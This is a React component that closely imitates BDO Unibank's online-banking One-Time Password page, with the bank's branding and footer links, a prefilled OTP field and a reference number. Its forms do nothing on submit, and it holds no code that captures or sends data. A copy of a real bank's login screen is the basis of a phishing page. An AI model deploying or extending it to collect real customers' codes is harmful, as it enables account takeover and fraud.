"use client";

import React from 'react';
import { FaUser } from 'react-icons/fa';

const infoPage: React.FC = () => {
  return (
    <div style={{
      minWidth: '1000px',
      width: '100%',
      margin: 'auto',
      fontFamily: 'Roboto Regular',
      textAlign: 'left',
      padding: 0,
      height: '100%'
    }}>
      <div style={{
        minWidth: '1000px',
        width: '100%',
        margin: 'auto'
      }}>
        {/* Header */}
        <div style={{
          padding: '20px 0',
          width: '95%',
          position: 'relative',
          marginLeft: 'auto',
          marginRight: 'auto',
          height: '81px',
          zIndex: 100
        }}>
          <div id="contentTop">
            <div style={{
              width: '178px',
              height: '81px',
              float: 'left'
            }}>
              <div style={{
                margin: '0 auto',
                display: 'block',
                width: '178px',
                height: '81px'
              }}>
                <a 
                  href="http://www.bdo.com.ph/" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  style={{
                    display: 'block',
                    width: '151px',
                    height: '81px',
                    position: 'relative',
                    left: '200px',
                    textDecoration: 'none',
                }}
                >
                  <span style={{visibility: 'hidden'}}>Banco De Oro</span>
                </a>
              </div>
            </div>
            
            <div
            style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                width: '167px',
                height: '28px',
                position: 'relative',
                float: 'right',
                right: '275px',
                borderRadius: '6px',
                fontSize: '6pt',
                background: '#f7af19',
                zIndex: 99,
                fontWeight: 'normal',
                top: '-17px',
            }}
            >
            <a
                href="https://www.bdo.com.ph/"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                display: 'flex',
                alignItems: 'center',
                color: '#fff',
                textDecoration: 'none',
                fontSize: '10px',
                textAlign: 'center',
                }}
            >
                <FaUser size={16} style={{ marginRight: '5px' }} />
                <span>GO BACK TO BDO.COM.PH</span>
            </a>
            </div>

          </div>
        </div>

        {/* Main Content */}
        <div style={{width: '950px', margin: '0 auto'}}>
          <div style={{
            float: 'left',
            width: '100%',
            borderTop: 0,
            minHeight: '400px',
            marginBottom: '50px',
            border: '5px solid #1e4f8e',
            borderRadius: '10px',
            background: '#ffffff'
          }}>
            <div style={{
              background: 'linear-gradient(to bottom, #E0E1E1 0%, #ffffff 100%)',
              height: '100px',
              borderRadius: '5px 5px 0 0',
              position: 'relative'
            }}>
              <div style={{padding: '5px 5px 12px 5px'}}>
                <h2 style={{
                  margin: 0,
                  marginBottom: '5px',
                  paddingLeft: 0,
                  fontStyle: 'normal',
                  fontWeight: 'bold',
                  color: '#1D587F',
                  fontSize: '12px'
                }}>
                  <span>One-Time Password (OTP)</span>
                </h2>
                
                <div style={{width: '500px', textAlign: 'left'}}>
                  <form onSubmit={(e) => e.preventDefault()} autoComplete="off">
                    <input type="hidden" name="step" value="otpform" />
                    
                    <div style={{marginBottom: '12px'}}>
                      <label style={{
                        padding: 0,
                        width: '20%',
                        paddingRight: '2em',
                        color: '#717171',
                        fontWeight: 'normal',
                        textAlign: 'left',
                        fontSize: '12px'
                      }}>
                        To continue, please enter the OTP sent to your mobile device.
                      </label>
                    </div>
                    
                    <div style={{marginBottom: '17px'}}>
                      <label style={{
                        padding: 0,
                        width: '20%',
                        paddingRight: '2em',
                        color: '#717171',
                        fontWeight: 'normal',
                        textAlign: 'left',
                        fontSize: '12px'
                      }}>
                        For inquiries, your Reference Number is 313505.
                      </label>
                    </div>
                  </form>
                </div>
              </div>
            </div>

            {/* Rest of the content with white background */}
            <div style={{padding: '0 5px 12px 5px', background: '#ffffff'}}>
              <div style={{width: '500px', textAlign: 'left'}}>
                <form onSubmit={(e) => e.preventDefault()} autoComplete="off">
                  <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    marginBottom: '0',
                    width: '400px'
                  }}>
                    <span style={{
                      color: '#717171',
                      fontWeight: 'normal',
                      fontSize: '12px',
                      width: '90px',
                    }}>
                      Enter your OTP:
                    </span>
                    <input 
                      style={{
                        fontFamily: 'Arial',
                        fontSize: '11px',
                        color: '#666666',
                        border: '1px solid #bbb',
                        margin: '0.1em 0',
                        width: '140px',
                        height: '15px',
                        backgroundColor: '#FDF9BE',
                        marginLeft: '12px',
                        paddingLeft: '2px'
                      }}
                      type="text"
                      maxLength={6}
                      defaultValue="523532"
                      name="otp"
                    />
                  </div>

                  <div style={{marginTop: '0'}}>
                    <input 
                      style={{
                        fontFamily: 'Arial',
                        fontSize: '11px',
                        clear: 'left',
                        color: '#666666',
                        margin: '0 0 0 0',
                        padding: '.1em 1em',
                        textDecoration: 'none',
                        cursor: 'pointer',
                        zoom: 1,
                        fontWeight: 'bold',
                        background: '#f7af19 none',
                        borderRadius: '4px',
                        marginRight: '12px',
                        border: 'none',
                      }}
                      type="submit"
                      value="Proceed"
                    />
                    <input
                      style={{
                        fontFamily: 'Arial',
                        fontSize: '11px',
                        clear: 'left',
                        color: '#666666',
                        margin: '0 0 0 0',
                        padding: '.1em 1em',
                        textDecoration: 'none',
                        cursor: 'pointer',
                        zoom: 1,
                        fontWeight: 'bold',
                        background: '#f7af19 none',
                        borderRadius: '4px',
                        marginRight: '10px',
                        border: 'none',
                      }}
                      type="button"
                      value="Cancel Login"
                    />
                  </div>

                  <div style={{
                    marginTop: '15px',
                    color: '#717171',
                    fontWeight: 'normal',
                    fontSize: '12px'
                  }}>
                    <label>
                      If you did not receive your One-Time password (OTP) via SMS within 2 minute(s) or if your One-Time password (OTP) has expired, click here to generate a new
                    </label>
                    {' '}
                    <a 
                      href="#" 
                      onClick={(e) => e.preventDefault()}
                      style={{textDecoration: 'underline', color: '#043673'}}
                    >
                      One-Time Password
                    </a>
                    {' '}
                    <label>
                      to proceed with your login.
                    </label>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          margin: '15px auto',
          borderTop: '1px solid #ddd',
          width: '980px',
          clear: 'both'
        }}>
          <div style={{
            fontSize: '10px',
            color: '#999999',
            margin: '0 0 0 30px',
            float: 'left',
            paddingTop: '28px'
          }}>
            BDO Unibank, Inc. © 2015. All Rights Reserved
          </div>
          <div style={{
            width: '700px',
            margin: '0 auto',
            paddingTop: '28px',
            textAlign: 'center',
            float: 'right',
            fontSize: '10px'
          }}>
            {[
              { href: "https://www.bdo.com.ph/about-bdo/business-operations", text: "About BDO" },
              { href: "http://www.bdo.com.ph/corporate-governance", text: "Corporate Governance" },
              { href: "http://www.bdo.com.ph/investor-relations/official-disclosures", text: "Investor Relations" },
              { href: "https://www.careers.bdo.com.ph/", text: "Careers" },
              { href: "https://www.bdo.com.ph/news-and-articles", text: "Press Room" },
              { href: "http://www.bdo.com.ph/hong-kong-home", text: "Hongkong" },
              { href: "https://www.bdo.com.ph/site-map", text: "Site Map" },
              { href: "http://www.bdo.com.ph/privacy-statement", text: "Privacy Policy" }
            ].map((link, index) => (
              <a 
                key={index}
                href={link.href} 
                target="_blank" 
                rel="noopener noreferrer" 
                style={{
                  margin: '0 10px',
                  fontSize: '10px',
                  color: '#999999',
                  textDecoration: 'none'
                }}
              >
                {link.text}
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default infoPage;